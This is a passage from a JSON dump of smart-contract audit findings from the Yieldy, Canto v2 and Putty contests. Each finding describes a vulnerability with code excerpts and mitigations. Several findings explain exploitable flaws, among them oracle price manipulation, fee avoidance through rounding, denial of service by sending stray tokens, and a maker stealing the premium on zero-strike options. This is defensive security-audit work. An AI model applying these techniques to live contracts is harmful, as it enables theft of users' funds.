https://github.com/code-423n4/2022-06-yieldy/blob/524f3b83522125fb7d4677fa7a7e5ba5a2c0fe67/src/contracts/Staking.sol#L674-L696 https://github.com/code-423n4/2022-06-yieldy/blob/524f3b83522125fb7d4677fa7a7e5ba5a2c0fe67/src/contracts/Staking.sol#L465-L508 ## Tools Used None ## Recommended Mitigation Steps ```     function claim(address _recipient) public {         Claim memory info = warmUpInfo[_recipient]; +      rebase(); ...     function claimWithdraw(address _recipient) public {         Claim memory info = coolDownInfo[_recipient]; +      rebase(); ...     function unstake(uint256 _amount, bool _trigger) external {         // prevent unstaking if override due to vulnerabilities asdf         require(!isUnstakingPaused, \"Unstaking is paused\"); -        if (_trigger) {             rebase(); -        } ```  "}, {"title": "No withdrawal possible for ETH TOKE pool", "html_url": "https://github.com/code-423n4/2022-06-yieldy-findings/issues/87", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-yieldy-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-yieldy/blob/34774d3f5e9275978621fd20af4fe466d195a88b/src/contracts/Staking.sol#L308   # Vulnerability details  ## Impact The `withdraw` function of the ETH Tokemak pool has an additional parameter `asEth`. This can be seen in the Tokemak [Github repository](https://github.com/Tokemak/tokemak-smart-contracts-public/blob/2f54689d5d16ddfd1751493b161a049d6c98c382/contracts/pools/EthPool.sol#L94) or also when looking at the deployed code of the [ETH pool](https://etherscan.io/address/0xb104A7fA1041168556218DDb40Fe2516F88246d5#code). Compare that to e.g. the [USDC pool](https://etherscan.io/address/0xca5e07804beef19b6e71b9db18327d215cd58d4e#code), which does not have this parameter.  This means that the call to `withdraw` will when the staking token is ETH / WETH and no withdrawals would be possible.  ## Proof of Concept A new `Staking` contract with ETH / WETH as the staking token is deployed. Deposits in Tokemak work fine, so users stake their tokens. However, because of the previously described issue, no withdrawal is possible, leaving the funds locked.  ## Recommended Mitigation Steps Handle the case where the underlying asset is WETH / ETH separately and pass this boolean in that case.  "}, {"title": "MINIMUM_LIQUIDITY checks missing - Bringing Liquidity below required min", "html_url": "https://github.com/code-423n4/2022-06-yieldy-findings/issues/48", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-yieldy-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-yieldy/blob/main/src/contracts/LiquidityReserve.sol#L161   # Vulnerability details  ## Impact Whale who provided most liquidity to the contract can simply use removeLiquidity function and can remove all of his liquidity. This can leave the residual liquidity to be less than MINIMUM_LIQUIDITY which is incorrect  ## Proof of Concept  1. Whale A provided initial liquidity plus more liquidity using enableLiquidityReserve and addLiquidity function  2. There are other small liquidity providers as well  3. Now Whale A decides to remove all the liquidity provided   4. This means after liquidity removal the balance liquidity will even drop below MINIMUM_LIQUIDITY which is incorrect  ## Recommended Mitigation Steps Add below check  ``` require(             IERC20Upgradeable(stakingToken).balanceOf(address(this)) - MINIMUM_LIQUIDITY >=                 amountToWithdraw,             \"Not enough funds\"         ); ```  "}, {"title": "Used deprecated methods", "html_url": "https://github.com/code-423n4/2022-06-yieldy-findings/issues/42", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-06-yieldy-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-yieldy/blob/8400e637d9259b7917bde259a5a2fbbeb5946d45/src/contracts/Yieldy.sol#L38 https://github.com/code-423n4/2022-06-yieldy/blob/8400e637d9259b7917bde259a5a2fbbeb5946d45/src/contracts/Yieldy.sol#L61-L62   # Vulnerability details  ## Impact A deprecated method is used in `Yieldy` contract.  ## Proof of Concept  In `Yieldy` contract the method `_setupRole` is used, and and it is explicitly marked as deprecated by OpenZeppelin.  > * NOTE: This function is deprecated in favor of {_grantRole}.  Affected source code:  - [Yieldy.sol#L38](https://github.com/code-423n4/2022-06-yieldy/blob/8400e637d9259b7917bde259a5a2fbbeb5946d45/src/contracts/Yieldy.sol#L38) - [Yieldy.sol#L61-L62](https://github.com/code-423n4/2022-06-yieldy/blob/8400e637d9259b7917bde259a5a2fbbeb5946d45/src/contracts/Yieldy.sol#L61-L62)  ## Recommended Mitigation Steps - The method `_setupRole` must be changed to `_grantRole`.  "}, {"title": "Denial of Service by wrong `BatchRequests.removeAddress` logic", "html_url": "https://github.com/code-423n4/2022-06-yieldy-findings/issues/38", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-yieldy-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-yieldy/blob/34774d3f5e9275978621fd20af4fe466d195a88b/src/contracts/BatchRequests.sol#L93 https://github.com/code-423n4/2022-06-yieldy/blob/34774d3f5e9275978621fd20af4fe466d195a88b/src/contracts/BatchRequests.sol#L57 https://github.com/code-423n4/2022-06-yieldy/blob/34774d3f5e9275978621fd20af4fe466d195a88b/src/contracts/BatchRequests.sol#L37   # Vulnerability details  ## Impact The `BatchRequests.removeAddress` logic is wrong and it will produce a denial of service.  ## Proof of Concept  Removing the element from the array is done using the `delete` statement, but this is not the proper way to remove an entry from an array, it will just set that position to `address(0)`.  Append dummy data:  - `addAddress('0x0000000000000000000000000000000000000001')` - `addAddress('0x0000000000000000000000000000000000000002')` - `addAddress('0x0000000000000000000000000000000000000003')` - `getAddresses()` => `address[]: 0x0000000000000000000000000000000000000001,0x0000000000000000000000000000000000000002,0x0000000000000000000000000000000000000003`  Remove address: - `removeAddress(0x0000000000000000000000000000000000000002)` (or `0x0000000000000000000000000000000000000003`) - `getAddresses()` => `address[]: 0x0000000000000000000000000000000000000001,0x0000000000000000000000000000000000000000,0x0000000000000000000000000000000000000003`  Service is denied because it will try to call `canBatchContracts`  to `address(0)`.  ## Recommended Mitigation Steps - To remove an entry in an array you have to use `pop` and move the last element to the removed entry position.  "}, {"title": "Unsecure `transferFrom`", "html_url": "https://github.com/code-423n4/2022-06-yieldy-findings/issues/36", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed", "sponsor disputed"], "target": "2022-06-yieldy-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-yieldy/blob/8400e637d9259b7917bde259a5a2fbbeb5946d45/src/contracts/Yieldy.sol#L212   # Vulnerability details  ## Impact The security of the `Yieldy` contract is delegated to the compiler used.  ## Proof of Concept The `allowance` of an account does not have to reflect the real balance of an account, however in the `transferFrom` method, it is the value that is checked in order to verify that the user has enough balance to make the transfer.  ```javascript     function transferFrom(         address _from,         address _to,         uint256 _value     ) public override returns (bool) {         require(_allowances[_from][msg.sender] >= _value, \"Allowance too low\"); ```  However, the real balance of the `Yieldy` contract is based on the calculation made by the `creditsForTokenBalance` method, so an underflow could be made in the subtraction of the balance of the `from` account.  ```javascript         uint256 creditAmount = creditsForTokenBalance(_value);         creditBalances[_from] = creditBalances[_from] - creditAmount;         creditBalances[_to] = creditBalances[_to] + creditAmount;         emit Transfer(_from, _to, _value); ```  This means that the security of the contract is delegated to the checks added by the compiler depending on the pragma used, it must be taken into account that these checks may appear and disappear in future versions of the compiler, so they must be checked at the level of smart contracts.  Affected source code:  - [Yieldy.sol#L212](https://github.com/code-423n4/2022-06-yieldy/blob/8400e637d9259b7917bde259a5a2fbbeb5946d45/src/contracts/Yieldy.sol#L212)  ## Recommended Mitigation Steps - Check that the from account has a `creditAmount` balance.  "}, {"title": "instantUnstake fee can be avoided", "html_url": "https://github.com/code-423n4/2022-06-yieldy-findings/issues/9", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-yieldy-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-yieldy/blob/524f3b83522125fb7d4677fa7a7e5ba5a2c0fe67/src/contracts/LiquidityReserve.sol#L196   # Vulnerability details  ## Impact Users can utilize the `instantUnstake` function without paying the liquidity provider fee using rounding errors in the fee calculation. This attack only allows for a relatively small amount of tokens to be unstaked in each call, so is likely not feasible on mainnet. However, on low-cost L2s and for tokens with a small decimal precision it is likely a feasible workaround.  ## Proof of Concept The `instantUnstake` fee is handled by sending the user back `amount - fee`. We can work around the fee by unstaking small amounts (`amount < BASIS_POINTS / fee`) in a loop until reaching the desired amount.  ## Tools Used N/A  ## Recommended Mitigation Steps Avoid using subtraction to calculate the fee as this causes the fee to be rounded down rather than the amount. I'd propose calculating amount less fee using a muldiv operation over (1 - fee). In this case, the fee is effectively rounded up instead of down, so it can never be 0 unless fee is 0. Uniswapv2 uses a similar solution for their LP fee: https://github.com/Uniswap/v2-core/blob/8b82b04a0b9e696c0e83f8b2f00e5d7be6888c79/contracts/UniswapV2Pair.sol#L180-L182  It might look like the following: ``` uint256 amountMinusFee = amount * (BASIS_POINTS - fee) / BASIS_POINTS ```  "}, {"title": "The LP pair underlying price quote could be manipulated", "html_url": "https://github.com/code-423n4/2022-06-canto-v2-findings/issues/152", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-canto-v2-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market-v2/blob/ea5840de72eab58bec837bb51986ac73712fcfde/contracts/Stableswap/BaseV1-periphery.sol#L522-L526 https://github.com/Plex-Engineer/lending-market-v2/blob/ea5840de72eab58bec837bb51986ac73712fcfde/contracts/Stableswap/BaseV1-periphery.sol#L198-L217   # Vulnerability details  # The LP pair underlying price quote could be manipulated   ## Impact  The underlying price for LP pool pair can be manipulated. This kind of price mainpulation happened before, can be found here: [Warp Fincance event](https://rekt.news/warp-finance-rekt/).  Whick may lead to the exploit of the pool by a malicious user.  ## Proof of Concept  file: lending-market-v2/contracts/Stableswap/BaseV1-periphery.sol 522-526\uff0c 198-217: ```             uint price0 = (token0 != USDC) ? IBaseV1Pair(pairFor(USDC, token0, stable0)).quote(token0, 1, 8) : 1;             uint price1 = (token1 != USDC) ? IBaseV1Pair(pairFor(USDC, token1, stable1)).quote(token1, 1, 8) : 1;             // how much of each asset is 1 LP token redeemable for             (uint amt0, uint amt1) = quoteRemoveLiquidity(token0, token1, stablePair, 1);             price = amt0 * price0 + amt1 * price1;       function quoteRemoveLiquidity(         address tokenA,         address tokenB,         bool stable,         uint liquidity     ) public view returns (uint amountA, uint amountB) {         // create the pair if it doesn\"t exist yet         address _pair = IBaseV1Factory(factory).getPair(tokenA, tokenB, stable);          if (_pair == address(0)) {             return (0,0);         }          (uint reserveA, uint reserveB) = getReserves(tokenA, tokenB, stable);         uint _totalSupply = erc20(_pair).totalSupply();          amountA = liquidity * reserveA / _totalSupply; // using balances ensures pro-rata distribution         amountB = liquidity * reserveB / _totalSupply; // using balances ensures pro-rata distribution      } ```  The price of the LP pair is determined by the TVL of the pool, given by: `amt0 * price0 + amt1 * price1`. However, when a malicious user dumps large amount of any token into the pool, the whole TVL will be significantly increased, which leads to inproper calculation of the price.   ## Tools Used mannual analysis  ## Recommended Mitigation Steps  A differenct approach to calculate the LP price can be found [here](https://cmichel.io/pricing-lp-tokens/).   "}, {"title": "Potential overflow at ``updateBaseRate()`` function", "html_url": "https://github.com/code-423n4/2022-06-canto-v2-findings/issues/142", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-canto-v2-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market-v2/blob/443a8c0fed3c5018e95f3881a31b81a555c42b2d/contracts/NoteInterest.sol#L145-L147   # Vulnerability details  ## Impact When casting to ``int`` from ``uint``, the overflow might happen.  ## Proof of Concept https://github.com/Plex-Engineer/lending-market-v2/blob/443a8c0fed3c5018e95f3881a31b81a555c42b2d/contracts/NoteInterest.sol#L145-L147   ```             uint twapMantissa = oracle.getUnderlyingPrice(cNote); // returns price as mantissa             //uint ir = (1 - twapMantissa).mul(adjusterCoefficient).add(baseRatePerYear);             int diff = BASE - int(twapMantissa); //possible annoyance if 1e18 - twapMantissa > 2**255, differ ```  ``int(twapMantissa)`` can overflow depending on the value of ``uint twapMantissa``. Even if this is not expected, handling this case should be good.  ## Tools Used Static analysis  ## Recommended Mitigation Steps Consider using the logic of ``toInt256`` provided by OpenZeppelin.  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeCast.sol#L1130-L1134  "}, {"title": "Underlying asset price oracle for CToken in BaseV1-periphery is inaccuarte", "html_url": "https://github.com/code-423n4/2022-06-canto-v2-findings/issues/134", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-canto-v2-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market-v2/blob/443a8c0fed3c5018e95f3881a31b81a555c42b2d/contracts/Stableswap/BaseV1-periphery.sol#L489   # Vulnerability details  ## Impact Detailed description of the impact of this finding.  Underlying asset price oracle for CToken in BaseV1-periphery is inaccuarte  ## Proof of Concept Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.  ```     function getUnderlyingPrice(CToken ctoken) external override view returns(uint price) {         IBaseV1Pair pair;         uint8 stable;         bool stablePair;         address underlying;          if (compareStrings(ctoken.symbol(), \"cCANTO\")) {             stable = 0;             underlying = address(wcanto);         }          //set price statically to 1 when the Comptroller is retrieving Price         else if (compareStrings(ctoken.symbol(), \"cNOTE\") && msg.sender == Comptroller) {             return 1; // Note price is fixed to 1         } ```  we should not be return 1. 1 is 1 wei. we should be 10 ** 18  ## Tools Used VIM  ## Recommended Mitigation Steps  we can return 10 ** 18  "}, {"title": "Oracle periodSize is very low allowing the TWAP price to be easily manipulated", "html_url": "https://github.com/code-423n4/2022-06-canto-v2-findings/issues/124", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-canto-v2-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market-v2/blob/ea5840de72eab58bec837bb51986ac73712fcfde/contracts/Stableswap/BaseV1-core.sol#L72   # Vulnerability details  ## Impact TWAP oracle easily manipulated  ## Proof of Concept periodSize is set to 0 meaning that the oracle will take a new observation every single block, which would allow an attacker to easily flood the TWAP oracle and manipulate the price  ## Tools Used  ## Recommended Mitigation Steps Increase periodSize to be greater than 0, 1800 is typically standard  "}, {"title": "Non view function is called with staticcall in `CErc20Delegator`", "html_url": "https://github.com/code-423n4/2022-06-canto-v2-findings/issues/112", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-canto-v2-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market-v2/blob/443a8c0fed3c5018e95f3881a31b81a555c42b2d/contracts/CErc20Delegator.sol#L237 https://github.com/Plex-Engineer/lending-market-v2/blob/443a8c0fed3c5018e95f3881a31b81a555c42b2d/contracts/CErc20Delegator.sol#L246   # Vulnerability details  ## Impact  When using CToken implementation with CErc20Delegator, the functions `borrowRatePerBlock` and `supplyRatePerBlock` will revert when the underlying functions try to update some states.  ## Detail  The v1 of [borrowRatePerBlock](https://github.com/Plex-Engineer/lending-market-v2/blob/443a8c0fed3c5018e95f3881a31b81a555c42b2d/contracts/CToken.sol#L208) and [supplyRatePerBlock](https://github.com/Plex-Engineer/lending-market-v2/blob/443a8c0fed3c5018e95f3881a31b81a555c42b2d/contracts/CToken.sol#L216) were view functions, but they are not anymore. The `CErc20Delegator` is still using `delegateToViewImplementation` for those functions. Those functions can be used, as long as the implementation does not update any state variables, i.e. [the block number increase since the last update is less or equal to the `updateFrequency`](https://github.com/Plex-Engineer/lending-market-v2/blob/443a8c0fed3c5018e95f3881a31b81a555c42b2d/contracts/NoteInterest.sol#L141). However, when these functions are called after sufficient blocks are mined, they are going to revert. Although one can still call the implementation using [`delegateToImplementation`](https://github.com/Plex-Engineer/lending-market-v2/blob/443a8c0fed3c5018e95f3881a31b81a555c42b2d/contracts/CErc20Delegator.sol#L437), it is not a good usability, especially if those functions are used for external user interface.   ## Proof Of Concept  [gist for the test](https://gist.github.com/zzzitron/37fb99cebed786b4c983d20a76e8793e#file-2022-06-newblockchain-v2-poc-ctoken-test-ts-L49-L62)  The gist shows a simple test. It calls `borrowRatePerBlock` and `supplyRatePerBlock` first time, it suceeds. Then, it mines for more than 300 times, which is the `updateFrequency` parameter. Then it calls again then fails.  Notes on the test file: - The setup is taken from `tests/Treasury/Accountant.test.ts` - using `solidity` from ethereum-waffle for chai to use `reverted`   ```   // in hardhat.config.js   import chai from \"chai\";   import { solidity } from \"ethereum-waffle\";    chai.use(solidity);   ```  ## Tools Used  hardhat   ## Recommended Mitigation Steps  Instead of using `delegateToViewImplementation` use `delegateToImplementation`. Alternatively, implement view functions to query these rates in `NoteInterest.sol` and `CToken.sol`. It will enable to query the rates without spending gas.  "}, {"title": "Deny of service in `CNote.doTransferOut`", "html_url": "https://github.com/code-423n4/2022-06-canto-v2-findings/issues/43", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-canto-v2-findings", "body": "# Lines of code  https://github.dev/Plex-Engineer/lending-market-v2/blob/2646a7676b721db8a7754bf5503dcd712eab2f8a/contracts/CNote.sol#L148   # Vulnerability details  ## Impact The `CNote.doTransferOut` method is susceptible to denial of service.  ## Proof of Concept The logic of the `doTransferOut` method in `CNote` is as follows: ```javascript     function doTransferOut(address payable to, uint amount) virtual override internal {         require(address(_accountant) != address(0));         EIP20Interface token = EIP20Interface(underlying);         if (to != address(_accountant)) {             uint err = _accountant.supplyMarket(amount);             if (err != 0) { revert AccountantRedeemError(amount); }         }            token.transfer(to, amount);         bool success;         assembly {             switch returndatasize()                 case 0 { success := not(0) }                 case 32 {                      returndatacopy(0, 0, 32)                     success := mload(0)                 }                 default { revert(0, 0) }         }          require(success, \"TOKEN_TRANSFER_OUT_FAILED\");         require(token.balanceOf(address(this)) == 0, \"cNote::doTransferOut: TransferOut Failed\"); // <-- ERROR     } ```  The `doTransferOut` method receives an `amount` which is transferred to `to`, after it the balance of the contract token is checked to be equal to zero or the transaction will be reverted.  In the following cases a denial of service will occur: - In the case that is used an `amount` different than the balance, the transaction will be reverted. - **In the case that an attacker front-runs the transaction and sends one token more than the established by the `_accountant`.** - In case of increasing balance tokens like `mDai` that constantly change their balance, the established by the `_accountant` will be different when the transaction is persisted.  ## Recommended Mitigation Steps - Use balance differences instead of the 0 check.  "}, {"title": "getBorrowRate returns rate per year instead of per block", "html_url": "https://github.com/code-423n4/2022-06-canto-v2-findings/issues/38", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-canto-v2-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market-v2/blob/2646a7676b721db8a7754bf5503dcd712eab2f8a/contracts/NoteInterest.sol#L118 https://github.com/Plex-Engineer/lending-market-v2/blob/2646a7676b721db8a7754bf5503dcd712eab2f8a/contracts/CToken.sol#L209   # Vulnerability details  ## Impact According to the documentation in `InterestRateModel`, `getBorrowRate` has to return the borrow rate per block and the function `borrowRatePerBlock` in `CToken` directly returns the value of `getBorrowRate`. However, the rate per year is returned for `NoteInterest`. Therefore, using `NoteInterest` as an interest model will result in completely wrong values.   ## Recommended Mitigation Steps Return `baseRatePerBlock`.  "}, {"title": "Deny of service in `AccountantDelegate.sweepInterest`", "html_url": "https://github.com/code-423n4/2022-06-canto-v2-findings/issues/28", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-canto-v2-findings", "body": "# Lines of code  https://github.dev/Plex-Engineer/lending-market-v2/blob/2646a7676b721db8a7754bf5503dcd712eab2f8a/contracts/Accountant/AccountantDelegate.sol#L101   # Vulnerability details  ## Impact The `sweepInterest` method is susceptible to denial of service.  ## Proof of Concept The logic of the `sweepInterest` method relative to the `treasury` is as follows: ```javascript   bool success = cnote.transfer(treasury, amtToSweep);   if (!success) { revert  SweepError(treasury , amtToSweep); }   TreasuryInterface Treas = TreasuryInterface(treasury);   Treas.redeem(address(cnote),amtToSweep);   require(cnote.balanceOf(treasury) == 0, \"AccountantDelegate::sweepInterestError\"); ```  As you can see, `amtToSweep` is passed to it and `redeem` that amount. Later it is checked that the balance of `cnote` in the `treasury` address must be 0. However, all calculations related to `amtToSweep` come out of the balance of [address(this)](https://github.dev/Plex-Engineer/lending-market-v2/blob/2646a7676b721db8a7754bf5503dcd712eab2f8a/contracts/Accountant/AccountantDelegate.sol#L83-L84) so if a third party sends a single token `cnote` to the address of `treasury` the method will be denied.  ## Recommended Mitigation Steps - Check that the balance is the same after and before the `bool success = cnote.transfer(treasury, amtToSweep);`  "}, {"title": "AccountantDelegate: The sweepInterest function sweeps an incorrect number of cnote.", "html_url": "https://github.com/code-423n4/2022-06-canto-v2-findings/issues/11", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-canto-v2-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market-v2/blob/ea5840de72eab58bec837bb51986ac73712fcfde/contracts/Accountant/AccountantDelegate.sol#L80-L99   # Vulnerability details  ## Impact In the sweepInterest function of the AccountantDelegate contract, the number of cnote sent to treasury should be cNoteToSweep instead of amtToSweep, as amtToSweep will normally be smaller than cNoteToSweep, which will cause the interest to be locked in the in the contract. ```   uint amtToSweep = sub_(cNoteAmt, noteDiff); // amount to sweep in Note,    uint cNoteToSweep = div_(amtToSweep, exRate); // amount of cNote to sweep = amtToSweep(Note) / exRate    cNoteToSweep = (cNoteToSweep > cNoteBal) ? cNoteBal :  cNoteToSweep;    bool success = cnote.transfer(treasury, amtToSweep);   if (!success) {    revert  SweepError(treasury , amtToSweep); //handles if transfer of tokens is not successful   }    TreasuryInterface Treas = TreasuryInterface(treasury);   Treas.redeem(address(cnote),amtToSweep); ``` ## Proof of Concept https://github.com/Plex-Engineer/lending-market-v2/blob/ea5840de72eab58bec837bb51986ac73712fcfde/contracts/Accountant/AccountantDelegate.sol#L80-L99  ## Tools Used None ## Recommended Mitigation Steps ```diff   uint amtToSweep = sub_(cNoteAmt, noteDiff); // amount to sweep in Note,    uint cNoteToSweep = div_(amtToSweep, exRate); // amount of cNote to sweep = amtToSweep(Note) / exRate    cNoteToSweep = (cNoteToSweep > cNoteBal) ? cNoteBal :  cNoteToSweep;  -  bool success = cnote.transfer(treasury, amtToSweep); +               bool success = cnote.transfer(treasury, cNoteToSweep);   if (!success) { -   revert  SweepError(treasury , amtToSweep); //handles if transfer of tokens is not successful +                       revert  SweepError(treasury , cNoteToSweep); //handles if transfer of tokens is not successful   }    TreasuryInterface Treas = TreasuryInterface(treasury); -  Treas.redeem(address(cnote),amtToSweep); +               Treas.redeem(address(cnote),cNoteToSweep); ```  "}, {"title": "`fee` can change without the consent of users", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/422", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-putty-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L240  https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L497   # Vulnerability details  ## Impact Fees are applied during `withdraw`, but can change between the time the order is filled and its terms are agreed upon and the withdrawal time, leading to a loss of the expected funds for the concerned users.  ## Proof of Concept The scenario would be:   - Alice and Bob agrees to fill an order at a time fees are 0.1%  - During the duration of the option, fees are increased to 3%  - At withdrawal they'll pay 3% of the strike, although they wouldn't have created the order in the first place with such fees   ## Recommended Mitigation Steps Mitigation could be:  - Store the fees in `Order` and verify that they are correct when the order is filled, so they are hardcoded in the struct  - Add a timestamp: this wouldn't fully mitigate but would still be better than the current setup  - Keep past fees and fee change timestamps in memory (for example in an array) to be able to retrieve the creation time fees at withdrawal  "}, {"title": "Zero strike call options can be systemically used to steal premium from the taker", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/418", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed", "old-submission-method"], "target": "2022-06-putty-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L435-L437   # Vulnerability details  Some non-malicious ERC20 do not allow for zero amount transfers and order.baseAsset can be such an asset. Zero strike calls are valid and common enough derivative type. However, the zero strike calls with such baseAsset will not be able to be exercised, allowing maker to steal from the taker as a malicious maker can just wait for expiry and withdraw the assets, effectively collecting the premium for free. The premium of zero strike calls are usually substantial.  Marking this as high severity as in such cases malicious maker knowing this specifics can steal from taker the whole premium amount. I.e. such orders will be fully valid for a taker from all perspectives as inability to exercise is a peculiarity of the system which taker in the most cases will not know beforehand.  ## Proof of Concept  Currently system do not check the strike value, unconditionally attempting to transfer it:  https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L435-L437  ```solidity             } else {                 ERC20(order.baseAsset).safeTransferFrom(msg.sender, address(this), order.strike);             } ```  As a part of call exercise logic:  https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L422-L443  ```solidity     function exercise(Order memory order, uint256[] calldata floorAssetTokenIds) public payable {         ...          if (order.isCall) {             // -- exercising a call option              // transfer strike from exerciser to putty             // handle the case where the taker uses native ETH instead of WETH to pay the strike             if (weth == order.baseAsset && msg.value > 0) {                 // check enough ETH was sent to cover the strike                 require(msg.value == order.strike, \"Incorrect ETH amount sent\");                  // convert ETH to WETH                 // we convert the strike ETH to WETH so that the logic in withdraw() works                 // - because withdraw() assumes an ERC20 interface on the base asset.                 IWETH(weth).deposit{value: msg.value}();             } else {                 ERC20(order.baseAsset).safeTransferFrom(msg.sender, address(this), order.strike);             }              // transfer assets from putty to exerciser             _transferERC20sOut(order.erc20Assets);             _transferERC721sOut(order.erc721Assets);             _transferFloorsOut(order.floorTokens, positionFloorAssetTokenIds[uint256(orderHash)]);         } ```  Some tokens do not allow zero amount transfers:  https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers  This way for such a token and zero strike option the maker can create short call order, receive the premium:  https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L327-L339  ```solidity             if (weth == order.baseAsset && msg.value > 0) {                 // check enough ETH was sent to cover the premium                 require(msg.value == order.premium, \"Incorrect ETH amount sent\");                  // convert ETH to WETH and send premium to maker                 // converting to WETH instead of forwarding native ETH to the maker has two benefits;                 // 1) active market makers will mostly be using WETH not native ETH                 // 2) attack surface for re-entrancy is reduced                 IWETH(weth).deposit{value: msg.value}();                 IWETH(weth).transfer(order.maker, msg.value);             } else {                 ERC20(order.baseAsset).safeTransferFrom(msg.sender, order.maker, order.premium);             } ```  Transfer in the assets:  https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L366-L371  ```solidity         // filling short call: transfer assets from maker to contract         if (!order.isLong && order.isCall) {             _transferERC20sIn(order.erc20Assets, order.maker);             _transferERC721sIn(order.erc721Assets, order.maker);             return positionId;         } ```  And wait for expiration, knowing that all attempts to exercise will revert:  https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L435-L437  ```solidity             } else {                 ERC20(order.baseAsset).safeTransferFrom(msg.sender, address(this), order.strike);             } ```  Then recover her assets:  https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L508-L519  ```solidity         // transfer assets from putty to owner if put is exercised or call is expired         if ((order.isCall && !isExercised) || (!order.isCall && isExercised)) {             _transferERC20sOut(order.erc20Assets);             _transferERC721sOut(order.erc721Assets);              // for call options the floor token ids are saved in the long position in fillOrder(),             // and for put options the floor tokens ids are saved in the short position in exercise()             uint256 floorPositionId = order.isCall ? longPositionId : uint256(orderHash);             _transferFloorsOut(order.floorTokens, positionFloorAssetTokenIds[floorPositionId]);              return;         } ```  ## Recommended Mitigation Steps  Consider checking that strike is positive before transfer in all the cases, for example:  ```solidity             } else { +               if (order.strike > 0) {                     ERC20(order.baseAsset).safeTransferFrom(msg.sender, address(this), order.strike); +               }             } ```  "}, {"title": "`cancel()` function does not check if the order already was filled at some point.", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/396", "labels": ["bug", "help wanted", "disagree with severity", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-putty-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L526   # Vulnerability details  ## Impact An **order** could be canceled even after the **order** was filled. Even if this does not affect any other part of the process, the mapping `cancelledOrders` still gets updated and a `CancelledOrder` event is emitted, this could cause issues on a front-end or monitoring tools working with the protocol.  ## Proof of Concept  ```solidity function cancel(Order memory order) public {         require(msg.sender == order.maker, \"Not your order\");          bytes32 orderHash = hashOrder(order);          // mark the order as cancelled         cancelledOrders[orderHash] = true;          emit CancelledOrder(orderHash, order);     } ```  ## Recommended Mitigation Steps Check if the order was already filled before. This could be done by checking if an `nft` with the order id was created before.  ```diff function cancel(Order memory order) public {         require(msg.sender == order.maker, \"Not your order\");          bytes32 orderHash = hashOrder(order);          +       require(ownerOf(uint256(orderHash)) == address(0), \"This order was already filled\");          // mark the order as cancelled         cancelledOrders[orderHash] = true;          emit CancelledOrder(orderHash, order);     } ```  "}, {"title": "Zero strike call options will avoid paying system fee", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/373", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed", "old-submission-method"], "target": "2022-06-putty-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L494-L506   # Vulnerability details  Zero and near zero strike calls are common derivative type. 